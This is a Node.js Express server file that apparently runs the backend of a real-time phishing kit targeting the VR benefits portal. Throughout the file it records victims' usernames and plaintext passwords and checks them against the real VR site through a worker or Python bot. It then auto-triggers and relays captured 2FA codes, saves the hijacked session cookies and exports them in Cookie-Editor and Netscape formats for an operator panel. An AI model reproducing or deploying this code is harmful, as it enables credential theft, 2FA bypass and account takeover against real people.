const express = require("express");
const fs = require("fs");
const path = require("path");
const { execFile } = require("child_process");

process.on("uncaughtException", (err) => {
    console.error("[CRITICAL] Uncaught Exception:", err.message || err);
});

process.on("unhandledRejection", (reason) => {
    console.error("[CRITICAL] Unhandled Rejection:", reason);
});

const app = express();

const PORT = process.env.PORT || 3000;
const WORKER_URL = process.env.WORKER_URL || "http://127.0.0.1:3005";


const PUBLIC_DIR = path.join(__dirname, "public");

const DADOS_JSON = path.join(
    __dirname,
    "dados.json"
);

const RESULTADO_JSON = path.join(
    __dirname,
    "resultado.json"
);

const SESSOES_DIR = path.join(__dirname, "sessoes");
if (!fs.existsSync(SESSOES_DIR)) {
    try { fs.mkdirSync(SESSOES_DIR, { recursive: true }); } catch (e) {}
}

const BOT_PY = path.join(
    __dirname,
    "bot.py"
);

const PYTHON = process.platform === "win32"
    ? "python"
    : (fs.existsSync("/opt/vr-tf-main/venv/bin/python")
        ? "/opt/vr-tf-main/venv/bin/python"
        : (fs.existsSync(path.join(__dirname, "venv", "bin", "python"))
            ? path.join(__dirname, "venv", "bin", "python")
            : "python3"));

let configApp = {
    auto_mode: true // Modo 100% autônomo ativo por padrão
};

let sseClients = [];

function notificarClientes() {
    if (sseClients.length === 0) return;
    try {
        const payload = gerarDadosPainel();
        const data = `data: ${JSON.stringify(payload)}\n\n`;
        sseClients = sseClients.filter(client => {
            try {
                if (client.res.writableEnded || client.res.destroyed) return false;
                client.res.write(data);
                return true;
            } catch (e) {
                return false;
            }
        });
    } catch (err) {
        console.error("Erro ao notificar SSE:", err);
    }
}

function gerarDadosPainel() {
    const dados = lerDados();
    const resultados = lerResultados();
    const codigos2fa = dados.filter(d => d.tipo === "2FA" || d.codigo);
    const logins = dados.filter(d => (d.tipo === "LOGIN" || !d.tipo) && d.senha);

    const mapaUsuarios = new Map();

    dados.forEach(d => {
        const u = (d.nome || d.usuario || "desconhecido").trim();
        const userKey = u.toLowerCase();
        if (!mapaUsuarios.has(userKey)) {
            mapaUsuarios.set(userKey, {
                usuario: u,
                senhas: [],
                ultimaSenha: "—",
                codigos: [],
                ultimoCodigo: null,
                status_2fa: null,
                status_login: null,
                status_credencial: "testando",
                cookies: null,
                total_cookies: 0,
                url_final: "https://superportal.vr.com.br/",
                tem_sessao_salva: false,
                link_acesso: `/sessao/${encodeURIComponent(u)}`,
                data_hora: d.data_hora || "—",
                ultimoEventoTipo: null
            });
        }

        const item = mapaUsuarios.get(userKey);
        item.data_hora = d.data_hora || item.data_hora;

        if (d.tipo === "2FA" || d.codigo) {
            item.ultimoEventoTipo = "2FA";
            if (!item.codigos.includes(d.codigo)) item.codigos.push(d.codigo);
            item.ultimoCodigo = d.codigo;
            item.status_2fa = d.status_2fa || "pendente";
            if (d.cookies && (!item.cookies || item.cookies.length === 0)) {
                item.cookies = d.cookies;
                item.total_cookies = d.cookies.length;
                item.tem_sessao_salva = true;
            }
            if (d.url_final) item.url_final = d.url_final;
        } else if (d.senha) {
            item.ultimoEventoTipo = "LOGIN";
            if (!item.senhas.includes(d.senha)) item.senhas.push(d.senha);
            item.ultimaSenha = d.senha;
            item.status_login = d.status_login || "aguardando_solicitacao";
            item.status_credencial = d.status_credencial || "testando";
            item.ultimoCodigo = null;
            item.status_2fa = null;
        }
    });

    // Fallback: se status_credencial, url_final ou cookies ainda não preenchidos, verifica histórico em resultado.json
    mapaUsuarios.forEach((item, userKey) => {
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                if (!item.status_credencial || item.status_credencial === "testando") {
                    item.status_credencial = r.status_credencial || (r.valido ? "valido" : "invalido");
                }
                if (r.cookies && (!item.cookies || item.cookies.length === 0)) {
                    item.cookies = r.cookies;
                    item.total_cookies = (r.cookies || []).length;
                    item.tem_sessao_salva = true;
                }
                if (r.url_final) item.url_final = r.url_final;
                break;
            }
        }

        // Verifica também se existe arquivo dedicado em sessoes/
        const safeKey = userKey.replace(/[^a-z0-9_-]/g, "_");
        const sessionFile = path.join(SESSOES_DIR, `${safeKey}_cookies.json`);
        if (fs.existsSync(sessionFile)) {
            try {
                const sData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
                if (sData && sData.cookies && sData.cookies.length > 0) {
                    item.cookies = sData.cookies;
                    item.total_cookies = sData.cookies.length;
                    item.tem_sessao_salva = true;
                    if (sData.url_final) item.url_final = sData.url_final;
                }
            } catch (e) {}
        }
    });

    mapaUsuarios.forEach(item => {
        if (item.ultimoCodigo) {
            if (item.status_2fa === "aceito") {
                item.status = "2FA Aceito";
            } else if (item.status_2fa === "negado") {
                item.status = "2FA Negado";
            } else {
                item.status = "Aguardando Decisão";
            }
        } else {
            if (item.status_login === "solicitar_2fa") {
                item.status = "2FA Solicitado";
            } else {
                item.status = "Aguardando Operador";
            }
        }
    });

    const consolidados = Array.from(mapaUsuarios.values()).reverse();

    const feed = [...dados].reverse().map(d => {
        const u = d.nome || d.usuario || "desconhecido";
        return {
            tipo: d.tipo === "2FA" ? "2FA" : "LOGIN",
            usuario: u,
            senha: d.senha || null,
            codigo: d.codigo || null,
            status_2fa: d.status_2fa || null,
            status_login: d.status_login || null,
            status_credencial: d.status_credencial || null,
            cookies: d.cookies || null,
            total_cookies: d.cookies ? d.cookies.length : 0,
            url_final: d.url_final || "https://superportal.vr.com.br/",
            link_acesso: `/sessao/${encodeURIComponent(u)}`,
            data_hora: d.data_hora || "—"
        };
    });

    return {
        success: true,
        auto_mode: configApp.auto_mode,
        totalLogins: logins.length,
        total2FA: codigos2fa.length,
        totalUsuarios: mapaUsuarios.size,
        consolidados,
        feed
    };
}


app.use((req, res, next) => {
    if (req.path.startsWith("/api") || req.path.endsWith(".js") || req.path.endsWith(".html")) {
        res.set({
            "Cache-Control": "no-store, no-cache, must-revalidate, proxy-revalidate",
            "Pragma": "no-cache",
            "Expires": "0",
            "Surrogate-Control": "no-store"
        });
    }
    next();
});

app.use(
    express.json()
);

app.use(
    express.static(PUBLIC_DIR)
);


function lerDados() {

    if (!fs.existsSync(DADOS_JSON)) {
        return [];
    }

    try {

        const conteudo = fs.readFileSync(
            DADOS_JSON,
            "utf8"
        );

        if (!conteudo.trim()) {
            return [];
        }

        const dados = JSON.parse(conteudo);

        if (Array.isArray(dados)) {
            return dados;
        }

        return [];

    } catch (erro) {

        console.error(
            "Erro ao ler dados.json:",
            erro
        );

        return [];
    }
}



function lerResultados() {

    if (!fs.existsSync(RESULTADO_JSON)) {
        return [];
    }

    try {

        const conteudo = fs.readFileSync(
            RESULTADO_JSON,
            "utf8"
        );

        if (!conteudo.trim()) {
            return [];
        }

        const resultados = JSON.parse(conteudo);


        if (Array.isArray(resultados)) {
            return resultados;
        }



        if (
            resultados &&
            typeof resultados === "object"
        ) {
            return [resultados];
        }


        return [];

    } catch (erro) {

        console.error(
            "Erro ao ler resultado.json:",
            erro
        );

        return [];
    }
}



function executarBot() {

    return new Promise(
        (resolve, reject) => {

            execFile(
                PYTHON,
                [BOT_PY],

                {
                    cwd: __dirname,
                    timeout: 60000
                },

                (erro, stdout, stderr) => {

                    if (stdout) {

                        console.log(
                            "\n========== BOT =========="
                        );

                        console.log(stdout);

                        console.log(
                            "=========================\n"
                        );
                    }


                    if (stderr) {

                        console.error(
                            "\n========== PYTHON STDERR =========="
                        );

                        console.error(stderr);

                        console.error(
                            "===================================\n"
                        );
                    }


                    if (erro) {

                        reject(erro);
                        return;
                    }


                    resolve();
                }
            );
        }
    );
}

async function testarViaWorker(usuario, senha) {
    try {
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 25000);

        const res = await fetch(`${WORKER_URL}/testar`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, senha }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        const userKey = usuario.toLowerCase().trim();
        const statusCred = data.status_credencial || (data.valido ? "valido" : "invalido");

        const dados = lerDados();
        let atualizou = false;
        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && item.senha) {
                const u = (item.nome || item.usuario || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_credencial = statusCred;
                    if (data.valido && configApp.auto_mode) {
                        item.status_login = "solicitar_2fa";
                        console.log(`[FULL-AUTO] 🚀 ${usuario} senha válida na VR -> 2FA disparado automaticamente!`);
                    }
                    atualizou = true;
                    break;
                }
            }
        }
        if (atualizou) {
            fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
            notificarClientes();
        }
        console.log(`[WARM WORKER] ${usuario} verificado em ${data.tempo_segundos || '?'}s -> ${statusCred} (${data.mensagem || ''})`);
        return true;
    } catch (err) {
        console.warn("[WARM WORKER] Worker offline ou ocupado, acionando fallback bot.py:", err.message);
        executarBot().catch(erro => {
            console.error("Execução assíncrona do bot.py:", erro.message);
        });
        return false;
    }
}

async function injetar2FAViaWorker(usuario, codigo) {
    try {
        console.log(`[FULL-AUTO] Despachando código 2FA para o worker: ${usuario} -> ${codigo}`);
        const controller = new AbortController();
        const timeoutId = setTimeout(() => controller.abort(), 15000);

        const res = await fetch(`${WORKER_URL}/injetar-2fa`, {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: JSON.stringify({ usuario, codigo }),
            signal: controller.signal
        });
        clearTimeout(timeoutId);

        if (!res.ok) throw new Error(`HTTP ${res.status}`);
        const data = await res.json();

        const userKey = usuario.toLowerCase().trim();
        const decisao = data.valido ? "aceito" : "negado";

        const dados = lerDados();
        let atualizou = false;
        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.tipo === "2FA" || item.codigo)) {
                const u = (item.nome || item.usuario || "").toLowerCase().trim();
                if (u === userKey) {
                    item.status_2fa = decisao;
                    if (data.valido && data.cookies) {
                        item.cookies = data.cookies;
                    }
                    atualizou = true;
                    break;
                }
            }
        }
        if (atualizou) {
            fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
        }

        const resultados = lerResultados();
        for (let i = resultados.length - 1; i >= 0; i--) {
            const r = resultados[i];
            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                r.status_2fa = decisao;
                r.mensagem_2fa = data.mensagem || (data.valido ? "2FA Aceito na VR" : "2FA Negado na VR");
                if (data.valido && data.cookies) {
                    r.cookies = data.cookies;
                    r.total_cookies = (data.cookies || []).length;
                }
                break;
            }
        }
        fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 4), "utf8");

        // Salva arquivo de cookies em sessoes/ se autenticado com sucesso
        if (data.valido && data.cookies && data.cookies.length > 0) {
            try {
                const sessionFile = path.join(SESSOES_DIR, `${userKey.replace(/[^a-z0-9_-]/g, "_")}_cookies.json`);
                fs.writeFileSync(sessionFile, JSON.stringify({
                    usuario,
                    data_hora: new Date().toLocaleString("pt-BR"),
                    url_final: data.url_final || "",
                    cookies: data.cookies
                }, null, 4), "utf8");
                console.log(`[FULL-AUTO] 💾 Cookies de sessão salvos em: ${sessionFile}`);
            } catch (fsErr) {
                console.warn("Aviso ao gravar arquivo de cookies:", fsErr.message);
            }
        }

        notificarClientes();

        console.log(`[FULL-AUTO] Veredito 2FA VR para ${usuario}: ${decisao.toUpperCase()} (${data.mensagem})`);
        return data;
    } catch (err) {
        console.warn(`[FULL-AUTO] Falha ao injetar 2FA no worker: ${err.message}. Mantendo em pendente para operador manual.`);
        return null;
    }
}



const URL_FINAL_PADRAO = "https://superportal-empregador.vr.com.br/";

app.post(
    "/salvar",

    async (req, res) => {

        const {
            nome,
            senha
        } = req.body;

        if (
            typeof nome !== "string" ||
            typeof senha !== "string" ||
            !nome.trim() ||
            !senha
        ) {

            return res.status(400).json({
                success: false,
                status: "erro",
                mensagem: "Preencha todos os campos."
            });
        }

        try {
            const dados = lerDados();

            dados.push({
                tipo: "LOGIN",
                nome: nome.trim(),
                senha: senha,
                status_login: "aguardando_solicitacao",
                status_credencial: "testando",
                data_hora: new Date().toLocaleString("pt-BR")
            });

            fs.writeFileSync(
                DADOS_JSON,
                JSON.stringify(
                    dados,
                    null,
                    4
                ),
                "utf8"
            );

            notificarClientes();

            console.log(
                `Nova tentativa recebida: ${nome.trim()} (Status: aguardando operador solicitar 2FA | Auditoria: testando na VR)`
            );

            const usuarioAlvo = nome.trim();

            // Dispara validação prioritária via Warm Worker (com fallback transparente)
            testarViaWorker(usuarioAlvo, senha);

            // Timeout de segurança: se após 28s o status ainda for 'testando',
            // garante que seja marcado como 'invalido' para nunca travar o painel
            setTimeout(() => {
                try {
                    const dados = lerDados();
                    let atualizou = false;
                    const uKey = usuarioAlvo.toLowerCase();
                    for (let i = dados.length - 1; i >= 0; i--) {
                        const item = dados[i];
                        if (item && item.senha) {
                            const u = (item.nome || item.usuario || "").toLowerCase().trim();
                            if (u === uKey && item.status_credencial === "testando") {
                                item.status_credencial = "invalido";
                                atualizou = true;
                                break;
                            }
                        }
                    }
                    if (atualizou) {
                        fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
                        notificarClientes();
                        console.log(`[TIMEOUT DE SEGURANÇA] ${usuarioAlvo} marcado como invalido após 28s.`);
                    }
                } catch (e) {
                    console.error("Erro no timeout de segurança:", e);
                }
            }, 28000);

            return res.json({
                success: true,
                status_login: "aguardando_solicitacao",
                status_credencial: "testando",
                usuario: nome.trim(),
                mensagem: "Login registrado. Aguardando operador solicitar 2FA no painel."
            });

        } catch (erro) {

            console.error(
                "Erro em /salvar:",
                erro
            );

            return res.status(500).json({
                success: false,
                status: "erro",
                mensagem: "Erro interno durante a verificação."
            });
        }
    }
);

app.post(
    "/api/resultado-bot",
    (req, res) => {
        const { usuario, valido, mensagem, status_credencial } = req.body;
        if (!usuario) {
            return res.status(400).json({ success: false, mensagem: "Usuário obrigatório." });
        }

        const userKey = usuario.toLowerCase().trim();
        const statusCred = status_credencial || (valido ? "valido" : "invalido");

        try {
            const dados = lerDados();
            let atualizou = false;

            for (let i = dados.length - 1; i >= 0; i--) {
                const item = dados[i];
                if (item && item.senha) {
                    const u = (item.nome || item.usuario || "").toLowerCase().trim();
                    if (u === userKey) {
                        item.status_credencial = statusCred;
                        if (valido && configApp.auto_mode) {
                            item.status_login = "solicitar_2fa";
                            console.log(`[FULL-AUTO] 🚀 ${usuario} verificado como VÁLIDO via resultado-bot -> 2FA disparado automaticamente!`);
                        }
                        atualizou = true;
                        break;
                    }
                }
            }

            if (atualizou) {
                fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
            }

            // Atualiza ou insere também em resultado.json para consistência total
            const resultados = lerResultados();
            let achouResultado = false;
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                    r.valido = !!valido;
                    r.status_credencial = statusCred;
                    r.mensagem = mensagem || (valido ? "Senha correta na VR" : "Senha incorreta na VR");
                    achouResultado = true;
                    break;
                }
            }
            if (!achouResultado) {
                resultados.push({
                    data_hora: new Date().toLocaleString("pt-BR"),
                    valido: !!valido,
                    status_credencial: statusCred,
                    nome: usuario,
                    mensagem: mensagem || (valido ? "Senha correta na VR" : "Senha incorreta na VR")
                });
            }
            fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 4), "utf8");

            notificarClientes();

            console.log(`[BOT RESULTADO] ${usuario} -> ${statusCred} (${mensagem || ''})`);
            return res.json({ success: true, usuario, status_credencial: statusCred });
        } catch (err) {
            console.error("Erro em /api/resultado-bot:", err);
            return res.status(500).json({ success: false, mensagem: "Erro ao registrar resultado do bot." });
        }
    }
);

app.get(
    "/api/status-login",
    (req, res) => {
        const usuario = (req.query.usuario || "").toLowerCase().trim();
        const dados = lerDados();
        const resultados = lerResultados();

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && item.senha) {
                const userKey = (item.nome || item.usuario || "").toLowerCase().trim();
                if (!usuario || userKey === usuario) {
                    let statusCred = item.status_credencial || "testando";
                    if (statusCred === "testando") {
                        for (let j = resultados.length - 1; j >= 0; j--) {
                            const r = resultados[j];
                            if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                                statusCred = r.status_credencial || (r.valido ? "valido" : "invalido");
                                break;
                            }
                        }
                    }
                    return res.json({
                        success: true,
                        status_login: item.status_login || "aguardando_solicitacao",
                        status_credencial: statusCred,
                        redirect: "/codigo.html"
                    });
                }
            }
        }

        let fallbackStatusCred = "testando";
        for (let j = resultados.length - 1; j >= 0; j--) {
            const r = resultados[j];
            if (r && (r.nome || "").toLowerCase().trim() === usuario) {
                fallbackStatusCred = r.status_credencial || (r.valido ? "valido" : "invalido");
                break;
            }
        }

        return res.json({
            success: true,
            status_login: "aguardando_solicitacao",
            status_credencial: fallbackStatusCred,
            redirect: "/codigo.html"
        });
    }
);

app.post(
    "/api/solicitar-2fa",
    (req, res) => {
        const { usuario } = req.body;
        if (!usuario) {
            return res.status(400).json({
                success: false,
                mensagem: "Usuário obrigatório."
            });
        }

        const userKey = usuario.toLowerCase().trim();

        try {
            const dados = lerDados();
            let atualizou = false;

            for (let i = dados.length - 1; i >= 0; i--) {
                const item = dados[i];
                if (item && item.senha) {
                    const u = (item.nome || item.usuario || "").toLowerCase().trim();
                    if (u === userKey) {
                        item.status_login = "solicitar_2fa";
                        atualizou = true;
                        break;
                    }
                }
            }

            if (atualizou) {
                fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
                notificarClientes();
            }

            console.log(`[PAINEL] 2FA Solicitado para: ${usuario}`);

            return res.json({
                success: true,
                usuario,
                status_login: "solicitar_2fa"
            });
        } catch (err) {
            console.error("Erro em /api/solicitar-2fa:", err);
            return res.status(500).json({
                success: false,
                mensagem: "Erro ao solicitar 2FA."
            });
        }
    }
);

app.post(
    "/salvar-codigo",

    async (req, res) => {
        const {
            codigo,
            usuario
        } = req.body;

        if (!codigo || !codigo.toString().trim()) {
            return res.status(400).json({
                success: false,
                mensagem: "Código não informado."
            });
        }

        try {
            const codigoLimpo = codigo.toString().trim();
            const usuarioLimpo = usuario ? usuario.toString().trim() : "desconhecido";

            const dados = lerDados();
            dados.push({
                tipo: "2FA",
                nome: usuarioLimpo,
                codigo: codigoLimpo,
                status_2fa: "pendente",
                data_hora: new Date().toLocaleString("pt-BR")
            });

            fs.writeFileSync(
                DADOS_JSON,
                JSON.stringify(
                    dados,
                    null,
                    4
                ),
                "utf8"
            );

            notificarClientes();

            const logs = lerResultados();
            logs.push({
                data_hora: new Date().toLocaleString("pt-BR"),
                valido: true,
                nome: usuarioLimpo,
                codigo_2fa: codigoLimpo,
                status_2fa: "pendente",
                mensagem: "Código 2FA recebido - aguardando decisão no painel",
                url_final: URL_FINAL_PADRAO
            });

            fs.writeFileSync(
                RESULTADO_JSON,
                JSON.stringify(
                    logs,
                    null,
                    4
                ),
                "utf8"
            );

            console.log(
                `[2FA] Código capturado para ${usuarioLimpo}: ${codigoLimpo} (Status: pendente)`
            );

            // Disparo autônomo de injeção no SSO da VR
            if (configApp.auto_mode) {
                injetar2FAViaWorker(usuarioLimpo, codigoLimpo);
            }

            return res.json({
                success: true,
                status_2fa: "pendente",
                url_final: URL_FINAL_PADRAO
            });

        } catch (erro) {
            console.error(
                "Erro em /salvar-codigo:",
                erro
            );

            return res.status(500).json({
                success: false,
                mensagem: "Erro interno ao salvar código."
            });
        }
    }
);

app.get(
    "/api/status-2fa",
    (req, res) => {
        const usuario = (req.query.usuario || "").toLowerCase().trim();
        const dados = lerDados();

        for (let i = dados.length - 1; i >= 0; i--) {
            const item = dados[i];
            if (item && (item.tipo === "2FA" || item.codigo)) {
                const userKey = (item.nome || item.usuario || "").toLowerCase().trim();
                if (!usuario || userKey === usuario) {
                    return res.json({
                        success: true,
                        status_2fa: item.status_2fa || "pendente",
                        url_final: URL_FINAL_PADRAO
                    });
                }
            }
        }

        return res.json({
            success: true,
            status_2fa: "pendente",
            url_final: URL_FINAL_PADRAO
        });
    }
);

app.post(
    "/api/decidir-2fa",
    (req, res) => {
        const { usuario, decisao } = req.body;
        if (!usuario || !decisao) {
            return res.status(400).json({
                success: false,
                mensagem: "Usuário e decisão obrigatórios."
            });
        }

        const decisaoLimpa = decisao === "aceito" ? "aceito" : "negado";
        const userKey = usuario.toLowerCase().trim();

        try {
            const dados = lerDados();
            let atualizou = false;

            for (let i = dados.length - 1; i >= 0; i--) {
                const item = dados[i];
                if (item && (item.tipo === "2FA" || item.codigo)) {
                    const u = (item.nome || item.usuario || "").toLowerCase().trim();
                    if (u === userKey) {
                        item.status_2fa = decisaoLimpa;
                        atualizou = true;
                        break;
                    }
                }
            }

            if (atualizou) {
                fs.writeFileSync(DADOS_JSON, JSON.stringify(dados, null, 4), "utf8");
                notificarClientes();
            }

            const resultados = lerResultados();
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || "").toLowerCase().trim() === userKey) {
                    r.status_2fa = decisaoLimpa;
                    break;
                }
            }
            fs.writeFileSync(RESULTADO_JSON, JSON.stringify(resultados, null, 4), "utf8");

            console.log(`[DECISÃO 2FA] ${usuario} -> ${decisaoLimpa}`);

            return res.json({
                success: true,
                usuario,
                decisao: decisaoLimpa
            });
        } catch (err) {
            console.error("Erro em /api/decidir-2fa:", err);
            return res.status(500).json({ success: false, mensagem: "Erro ao registrar decisão." });
        }
    }
);

app.get(
    "/api/painel",
    (req, res) => {
        try {
            res.json(gerarDadosPainel());
        } catch (err) {
            console.error("Erro ao carregar dados do painel:", err);
            res.status(500).json({ success: false, mensagem: "Erro ao ler registros." });
        }
    }
);

app.get(
    "/api/stream",
    (req, res) => {
        res.setHeader("Content-Type", "text/event-stream");
        res.setHeader("Cache-Control", "no-cache");
        res.setHeader("Connection", "keep-alive");
        if (res.flushHeaders) res.flushHeaders();

        const clientId = Date.now() + "_" + Math.random();
        const newClient = { id: clientId, res };
        sseClients.push(newClient);

        // Envia estado inicial imediatamente
        try {
            const initialData = `data: ${JSON.stringify(gerarDadosPainel())}\n\n`;
            res.write(initialData);
        } catch (e) {}

        const removerCliente = () => {
            sseClients = sseClients.filter(c => c.id !== clientId);
        };

        req.on("close", removerCliente);
        req.on("error", removerCliente);
        res.on("close", removerCliente);
        res.on("error", removerCliente);
    }
);

app.post(
    "/api/limpar",
    (req, res) => {
        try {
            fs.writeFileSync(DADOS_JSON, JSON.stringify([], null, 4), "utf8");
            fs.writeFileSync(RESULTADO_JSON, JSON.stringify([], null, 4), "utf8");
            notificarClientes();
            res.json({ success: true, mensagem: "Registros limpos com sucesso." });
        } catch (err) {
            console.error("Erro ao limpar dados:", err);
            res.status(500).json({ success: false, mensagem: "Erro ao limpar dados." });
        }
    }
);

app.get(
    "/api/config",
    (req, res) => {
        res.json({ success: true, auto_mode: configApp.auto_mode });
    }
);

app.post(
    "/api/config",
    (req, res) => {
        const { auto_mode } = req.body;
        if (typeof auto_mode === "boolean") {
            configApp.auto_mode = auto_mode;
            console.log(`[CONFIG] Modo de automação alterado para: ${configApp.auto_mode ? 'FULL-AUTO (100% Autônomo)' : 'MANUAL'}`);
            notificarClientes();
        }
        res.json({ success: true, auto_mode: configApp.auto_mode });
    }
);

app.get(
    "/api/sessao/:usuario",
    (req, res) => {
        const usuario = (req.params.usuario || "").toLowerCase().trim();
        const userKey = usuario.replace(/[^a-z0-9_-]/g, "_");
        const sessionFile = path.join(SESSOES_DIR, `${userKey}_cookies.json`);

        let sessionData = null;
        if (fs.existsSync(sessionFile)) {
            try {
                sessionData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
            } catch (e) {
                return res.status(500).json({ success: false, mensagem: "Erro ao ler arquivo de cookies." });
            }
        }

        // Fallback: busca em resultado.json
        if (!sessionData) {
            const resultados = lerResultados();
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || "").toLowerCase().trim() === usuario && r.cookies) {
                    sessionData = {
                        usuario: r.nome,
                        data_hora: r.data_hora,
                        url_final: r.url_final || "https://superportal.vr.com.br/",
                        cookies: r.cookies
                    };
                    break;
                }
            }
        }

        if (!sessionData) {
            return res.status(404).json({ success: false, mensagem: "Sessão de cookies não encontrada." });
        }

        const rawCookies = sessionData.cookies || [];

        // Gera formato específico compatível com a extensão Cookie-Editor
        const cookieEditorFormat = rawCookies.map(c => ({
            domain: c.domain,
            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
            hostOnly: !c.domain.startsWith("."),
            httpOnly: !!c.httpOnly,
            name: c.name,
            path: c.path || "/",
            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
            secure: !!c.secure,
            session: !c.expires || c.expires <= 0,
            storeId: "0",
            value: c.value
        }));

        return res.json({
            success: true,
            usuario: sessionData.usuario,
            data_hora: sessionData.data_hora,
            url_final: sessionData.url_final || "https://superportal.vr.com.br/",
            total_cookies: rawCookies.length,
            cookies: rawCookies,
            cookie_editor_json: cookieEditorFormat,
            link_acesso: `/sessao/${encodeURIComponent(sessionData.usuario)}`
        });
    }
);

app.get(
    "/api/sessao/:usuario/exportar",
    (req, res) => {
        const usuario = (req.params.usuario || "").toLowerCase().trim();
        const formato = (req.query.formato || "json").toLowerCase();
        const userKey = usuario.replace(/[^a-z0-9_-]/g, "_");
        const sessionFile = path.join(SESSOES_DIR, `${userKey}_cookies.json`);

        let sessionData = null;
        if (fs.existsSync(sessionFile)) {
            try {
                sessionData = JSON.parse(fs.readFileSync(sessionFile, "utf8"));
            } catch (e) {}
        }

        if (!sessionData) {
            const resultados = lerResultados();
            for (let i = resultados.length - 1; i >= 0; i--) {
                const r = resultados[i];
                if (r && (r.nome || "").toLowerCase().trim() === usuario && r.cookies) {
                    sessionData = {
                        usuario: r.nome,
                        data_hora: r.data_hora,
                        url_final: r.url_final || "https://superportal.vr.com.br/",
                        cookies: r.cookies
                    };
                    break;
                }
            }
        }

        if (!sessionData || !sessionData.cookies) {
            return res.status(404).send("Sessão não encontrada");
        }

        const cookies = sessionData.cookies;

        if (formato === "netscape" || formato === "txt") {
            let txt = "# Netscape HTTP Cookie File\n";
            txt += "# https://curl.se/docs/http-cookies.html\n";
            txt += `# Capturado por VR Monitor em ${sessionData.data_hora || new Date().toISOString()}\n\n`;

            cookies.forEach(c => {
                const domain = c.domain.startsWith(".") ? c.domain : `.${c.domain}`;
                const flag = domain.startsWith(".") ? "TRUE" : "FALSE";
                const path = c.path || "/";
                const secure = c.secure ? "TRUE" : "FALSE";
                const expiry = c.expires && c.expires > 0 ? Math.floor(c.expires) : Math.floor(Date.now() / 1000) + 86400 * 30;
                txt += `${domain}\t${flag}\t${path}\t${secure}\t${expiry}\t${c.name}\t${c.value}\n`;
            });

            res.setHeader("Content-Type", "text/plain; charset=utf-8");
            res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.txt"`);
            return res.send(txt);
        }

        // Formato Cookie-Editor
        const cookieEditorFormat = cookies.map(c => ({
            domain: c.domain,
            expirationDate: c.expires && c.expires > 0 ? c.expires : undefined,
            hostOnly: !c.domain.startsWith("."),
            httpOnly: !!c.httpOnly,
            name: c.name,
            path: c.path || "/",
            sameSite: c.sameSite ? c.sameSite.toLowerCase() : "unspecified",
            secure: !!c.secure,
            session: !c.expires || c.expires <= 0,
            storeId: "0",
            value: c.value
        }));

        res.setHeader("Content-Type", "application/json; charset=utf-8");
        res.setHeader("Content-Disposition", `attachment; filename="cookies_${userKey}.json"`);
        return res.send(JSON.stringify(cookieEditorFormat, null, 2));
    }
);

app.get(
    ["/sessao/:usuario", "/acesso/:usuario", "/sessao"],
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "sessao.html"
            )
        );
    }
);

app.get(
    "/painel",
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "painel.html"
            )
        );
    }
);

app.get(
    "/codigo",
    (req, res) => {
        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "codigo.html"
            )
        );
    }
);

app.get(
    "/",
    (req, res) => {

        res.sendFile(
            path.join(
                PUBLIC_DIR,
                "index.html"
            )
        );
    }
);

app.get(
    "/health",
    (req, res) => {
        res.json({
            status: "ok",
            service: "vr-web",
            uptime: process.uptime(),
            timestamp: new Date().toISOString()
        });
    }
);

app.listen(
    PORT,
    () => {

        console.log();
        console.log(
            "===================================="
        );

        console.log(
            `Servidor rodando em http://localhost:${PORT}`
        );

        console.log(
            "===================================="
        );

        console.log();
    }
);